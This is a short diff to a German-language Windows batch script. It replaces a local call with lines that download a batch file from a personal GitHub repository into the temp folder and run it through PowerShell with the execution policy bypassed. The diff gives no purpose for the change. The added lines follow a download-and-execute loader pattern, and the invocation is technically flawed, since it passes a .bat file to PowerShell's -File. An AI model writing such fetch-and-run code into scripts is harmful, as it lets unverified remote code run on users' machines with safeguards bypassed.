@@ -41,4 +41,6 @@ if %errorlevel% equ 0 (
     echo Es gab ein Problem beim Starten des PowerShell-Skripts.
 )
 
-Programm_welches_das_eigentliche_Autostartet.bat
+cd %TEMP%
+Powershell -Command "Invoke-WebRequest 'https://raw.githubusercontent.com/max65481/88/refs/heads/main/Programm_welches_das_eigentliche_Autostartet.bat' -OutFile Start_der_datei.bat"
+Powershell -ExecutionPolicy Bypass -File "%TEMP%\Start_der_datei.bat"
